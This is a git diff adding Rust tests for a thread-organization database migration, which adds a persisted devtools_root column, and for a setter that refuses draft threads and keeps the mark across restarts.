new file mode 100644
index 0000000..05d75a7
--- /dev/null
+++ b/crates/agent_ui/src/thread_organization/devtools_root_tests.rs
@@ -0,0 +1,224 @@
+// Story 055, task 10.1 — migration step 2 and the persisted devtools mark (design.md §Data
+// Models, D4, GOTCHA G8, G9). Requirements: R5.2, R5.3 (Q4, Q5). Materialize with, in
+// `src/thread_organization.rs`:
+//
+//     #[cfg(test)]
+//     #[path = "thread_organization/devtools_root_tests.rs"]
+//     mod devtools_root;
+//
+// Filter: `cargo test -p agent_ui thread_organization` (paths `thread_organization::devtools_root::…`).
+//
+// Two levels. Plain `#[test]`s over `Connection::open_memory` for the migration (the pattern of
+// story 031's `thread_organization::migration`), and `#[gpui::test]`s over the store for the
+// setter `ThreadOrganizationStore::set_devtools_root(thread_id, root, cx)` (design.md §B3), using
+// story 031's `test_helpers` (`init`, `thread`, `draft_in`, `open_db`, `open_store`, `restart`).
+// The field is `devtools_root`; its type is read through `Path::new`, so `Option<String>` and
+// `Option<PathBuf>` both satisfy the test.
+//
+// Hostile halves first:
+//   - append-only (G9): a database migrated by the PREVIOUS build (every step but the last) gets the
+//     column and keeps its rows — the case an in-place edit of step 1 silently skips; no earlier step
+//     mentions `devtools_root`;
+//   - emptiness: a row whose ONLY organization is the devtools mark is not empty (a row judged empty
+//     is deleted, which would drop the mark — R5.2), while a default row still is;
+//   - NULL is the editor thread: an existing row reads `devtools_root IS NULL` after migrating;
+//   - the setter respects the draft rule (G8): a DRAFT is refused, which is why the mark waits for
+//     promotion (D4), while a saved thread's mark survives a restart;
+//   - column-scoped in both orders: pin then mark keeps the pin, mark then pin keeps the mark.
+
+use std::path::{Path, PathBuf};
+
+use db::sqlez::{connection::Connection, domain::Domain as _};
+use gpui::{Entity, TestAppContext};
+
+use super::test_helpers::*;
+use super::{ThreadOrganization, ThreadOrganizationDb, ThreadOrganizationStore};
+use crate::thread_metadata_store::ThreadId;
+
+fn migrate(connection: &Connection, steps: &'static [&'static str]) {
+    connection
+        .migrate(ThreadOrganizationDb::NAME, steps, &mut |_, _, _| false)
+        .expect("the thread organization migrations should apply");
+}
+
+fn columns(connection: &Connection, table: &str) -> Vec<String> {
+    connection
+        .select::<String>(&format!("SELECT name FROM pragma_table_info('{table}')"))
+        .expect("pragma should prepare")()
+    .expect("pragma should run")
+}
+
+#[test]
+fn hostile_no_earlier_step_was_edited_in_place() {
+    let steps = ThreadOrganizationDb::MIGRATIONS;
+    assert!(steps.len() >= 2, "the mark is an appended step");
+    let (last, earlier) = steps.split_last().expect("steps");
+    for (i, step) in earlier.iter().enumerate() {
+        assert!(
+            !step.contains("devtools_root"),
+            "step {i} mentions devtools_root: existing databases would never get it (G9)"
+        );
+    }
+    assert!(
+        last.contains("devtools_root"),
+        "the last step adds the column"
+    );
+    assert!(
+        last.to_ascii_uppercase()
+            .contains("ALTER TABLE THREAD_ORGANIZATION ADD COLUMN"),
+        "an ALTER, not a re-created table: {last}"
+    );
+}
+
+#[test]
+fn hostile_a_database_of_the_previous_build_gets_the_column_and_keeps_its_rows() {
+    let steps = ThreadOrganizationDb::MIGRATIONS;
+    let connection = Connection::open_memory(Some("devtools_root_previous_build"));
+    migrate(&connection, &steps[..steps.len() - 1]);
+    assert!(!columns(&connection, "thread_organization").contains(&"devtools_root".to_string()));
+    let thread = ThreadId::new();
+    connection
+        .exec_bound::<ThreadId>(
+            "INSERT INTO thread_organization (thread_id, pinned_position) VALUES (?, 3)",
+        )
+        .expect("insert should prepare")(thread)
+    .expect("insert should run");
+
+    migrate(&connection, steps);
+    assert!(columns(&connection, "thread_organization").contains(&"devtools_root".to_string()));
+    let rows = connection
+        .select_bound::<ThreadId, (Option<i64>, Option<String>)>(
+            "SELECT pinned_position, devtools_root FROM thread_organization WHERE thread_id = ?",
+        )
+        .expect("select should prepare")(thread)
+    .expect("select should run");
+    assert_eq!(
+        rows,
+        vec![(Some(3), None)],
+        "the row survives as an editor thread (NULL)"
+    );
+}
+
+#[test]
+fn a_fresh_database_has_the_column_and_migrating_twice_is_harmless() {
+    let connection = Connection::open_memory(Some("devtools_root_fresh"));
+    migrate(&connection, ThreadOrganizationDb::MIGRATIONS);
+    migrate(&connection, ThreadOrganizationDb::MIGRATIONS);
+    assert!(columns(&connection, "thread_organization").contains(&"devtools_root".to_string()));
+}
+
+#[test]
+fn a_root_is_stored_and_read_back_verbatim() {
+    let connection = Connection::open_memory(Some("devtools_root_verbatim"));
+    migrate(&connection, ThreadOrganizationDb::MIGRATIONS);
+    let thread = ThreadId::new();
+    connection
+        .exec_bound::<ThreadId>(
+            "INSERT INTO thread_organization (thread_id, devtools_root) VALUES (?, '/home/dev/my app/é')",
+        )
+        .expect("insert should prepare")(thread)
+    .expect("insert should run");
+    let roots = connection
+        .select_bound::<ThreadId, Option<String>>(
+            "SELECT devtools_root FROM thread_organization WHERE thread_id = ?",
+        )
+        .expect("select should prepare")(thread)
+    .expect("select should run");
+    assert_eq!(roots, vec![Some("/home/dev/my app/é".to_string())]);
+}
+
+#[test]
+fn hostile_a_row_holding_only_the_mark_is_not_empty() {
+    let marked = ThreadOrganization {
+        devtools_root: Some("/home/dev/app".into()),
+        ..Default::default()
+    };
+    assert!(
+        !marked.is_empty(),
+        "an empty row is deleted, and the mark with it (R5.2)"
+    );
+    let root = marked
+        .devtools_root
+        .as_ref()
+        .map(|r| Path::new(r).display().to_string());
+    assert_eq!(root.as_deref(), Some("/home/dev/app"));
+    assert!(
+        ThreadOrganization::default().is_empty(),
+        "a default row is still empty"
+    );
+}
+
+// ---- the setter, over the store ------------------------------------------------------------
+
+fn root_of(
+    store: &Entity<ThreadOrganizationStore>,
+    id: ThreadId,
+    cx: &mut TestAppContext,
+) -> Option<String> {
+    store.read_with(cx, |store, _| {
+        store.organization(id).and_then(|org| {
+            org.devtools_root
+                .as_ref()
+                .map(|r| Path::new(r).display().to_string())
+        })
+    })
+}
+
+#[gpui::test]
+async fn hostile_a_draft_is_refused_while_a_saved_threads_mark_survives_a_restart(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let draft = draft_in("/p/app", cx);
+    let saved = thread_in("/p/app", cx);
+    let db = open_db("devtools_root_setter_restart").await;
+    let store = open_store(&db, cx);
+    store.update(cx, |store, cx| {
+        assert!(
+            store
+                .set_devtools_root(draft, PathBuf::from("/p/app"), cx)
+                .is_err(),
+            "G8: a draft is not organized; the mark waits for promotion"
+        );
+        store
+            .set_devtools_root(saved, PathBuf::from("/p/app"), cx)
+            .expect("a saved thread takes the mark");
+    });
+    assert_eq!(root_of(&store, saved, cx).as_deref(), Some("/p/app"));
+    let store = restart(store, &db, cx);
+    assert_eq!(
+        root_of(&store, saved, cx).as_deref(),
+        Some("/p/app"),
+        "R5.2: persisted"
+    );
+    assert_eq!(root_of(&store, draft, cx), None);
+}
+
+#[gpui::test]
+async fn hostile_the_mark_and_a_pin_never_overwrite_each_other(cx: &mut TestAppContext) {
+    init(cx);
+    let pinned_first = thread(cx);
+    let marked_first = thread(cx);
+    let db = open_db("devtools_root_setter_columns").await;
+    let store = open_store(&db, cx);
+    store.update(cx, |store, cx| {
+        store.pin(pinned_first, cx).expect("pin");
+        store
+            .set_devtools_root(pinned_first, PathBuf::from("/p/app"), cx)
+            .expect("mark");
+        store
+            .set_devtools_root(marked_first, PathBuf::from("/p/web"), cx)
+            .expect("mark");
+        store.pin(marked_first, cx).expect("pin");
+    });
+    let store = restart(store, &db, cx);
+    assert_eq!(root_of(&store, pinned_first, cx).as_deref(), Some("/p/app"));
+    assert_eq!(root_of(&store, marked_first, cx).as_deref(), Some("/p/web"));
+    let pins = store.read_with(cx, |store, _| {
+        (
+            store.pinned_position(pinned_first).is_some(),
+            store.pinned_position(marked_first).is_some(),
+        )
+    });
+    assert_eq!(pins, (true, true), "both pins survived the marks");
+}
